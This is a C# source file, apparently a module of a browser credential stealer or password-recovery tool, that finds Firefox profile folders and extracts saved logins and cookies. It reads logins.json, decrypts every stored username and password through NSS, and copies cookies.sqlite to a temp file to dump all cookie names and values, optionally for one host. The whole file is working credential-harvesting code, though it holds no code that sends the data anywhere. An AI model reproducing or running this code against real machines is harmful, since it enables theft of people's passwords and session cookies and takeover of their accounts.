using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;

namespace dao
{
    class Firefox : IReader
    {
        public string BrowserName { get { return "Firefox"; } }
        public IEnumerable<PassModel> Passwords(string host = null)
        {
            string signonsFile = null;
            string loginsFile = null;
            bool signonsFound = false;
            bool loginsFound = false;
            var logins = new List<PassModel>();
            try
            {
                string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

                if (dirs.Length == 0)
                    return logins;

                foreach (string dir in dirs)
                {
                    string[] files = Directory.GetFiles(dir, "signons.sqlite");
                    if (files.Length > 0)
                    {
                        signonsFile = files[0];
                        signonsFound = true;
                    }

                    // find &quot;logins.json"file
                    files = Directory.GetFiles(dir, "logins.json");
                    if (files.Length > 0)
                    {
                        loginsFile = files[0];
                        loginsFound = true;
                    }

                    if (loginsFound || signonsFound)
                    {
                        TableFF.NSS_Init(dir);
                        break;
                    }

                }

                //if (signonsFound)
                //{
                //    using (var conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
                //    {
                //        conn.Open();
                //        using (var command = conn.CreateCommand())
                //        {
                //            command.CommandText = "SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins";
                //            using (var reader = command.ExecuteReader())
                //            {
                //                while (reader.Read())
                //                {
                //                    string username = TableFF.Decrypt(reader.GetString(0));
                //                    string password = TableFF.Decrypt(reader.GetString(1));

                //                    logins.Add(new PassModel
                //                    {
                //                        Username = username,
                //                        Password = password,
                //                        Url = reader.GetString(2)
                //                    });
                //                }
                //            }
                //        }
                //        conn.Close();
                //    }

                //}

                if (loginsFound)
                {
                    FFLogins ffLoginData;
                    using (StreamReader sr = new StreamReader(loginsFile))
                    {
                        string json = sr.ReadToEnd();
                        ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
                    }

                    foreach (LoginData loginData in ffLoginData.logins)
                    {
                        string url = loginData.hostname;
                        if (host != null && url != host) continue;
                        string username = TableFF.Decrypt(loginData.encryptedUsername);
                        string password = TableFF.Decrypt(loginData.encryptedPassword);
                        logins.Add(new PassModel
                        {
                            Username = username,
                            Password = password,
                            Url = url
                        });
                    }
                }
                return logins;
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                return logins;
            }
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            String profileName = "Default";
            var result = new List<Cookie>();
            try
            {
                var cookiePath = GetFirefoxCookieStore();
                if (File.Exists(cookiePath))
                {
                    String APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    string target = APPDATA_PATH + @"\tempc";
                    if (File.Exists(target))
                        File.Delete(target);
                    File.Copy(cookiePath, target);
                    using (var conn = new SQLiteConnection($"Data Source={target};pooling=false"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            if (host == null)
                            {
                                cmd.CommandText = "SELECT host,name,value FROM moz_cookies";
                            }
                            else
                            {
                                var prm = cmd.CreateParameter();
                                prm.ParameterName = "hostName";
                                prm.Value = host;
                                cmd.Parameters.Add(prm);
                                cmd.CommandText = "SELECT name,value FROM moz_cookies WHERE host = @hostName";
                            }
                            using (var reader = cmd.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    while (reader.Read())
                                    {
                                        try
                                        {
                                            result.Add(new Cookie()
                                            {
                                                Profile = profileName,
                                                Url = reader.GetString(0),
                                                Name = reader.GetString(1),
                                                Value = reader.GetString(2)
                                            });
                                        }
                                        catch (Exception ex)
                                        {
                                            Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    if (File.Exists(target))
                        File.Delete(target);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed in {profileName} : " + ex.Message);
            }
            return result;
        }

        private static String GetFirefoxCookieStore()
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
            DirectoryInfo dInfo = new DirectoryInfo(path);
            FileInfo[] files = dInfo.GetFiles("cookies.sqlite", SearchOption.AllDirectories);
            if (files.Length == 0)
                throw new System.IO.FileNotFoundException("Cannot find cookie store\r\n" + path, path);
            return files[0].FullName;
        }

        class FFLogins
        {
            public long nextId { get; set; }
            public LoginData[] logins { get; set; }
            public string[] disabledHosts { get; set; }
            public int version { get; set; }
        }

        class LoginData
        {
            public long id { get; set; }
            public string hostname { get; set; }
            public string url { get; set; }
            public string httprealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public long timesUsed { get; set; }
        }
    }
}
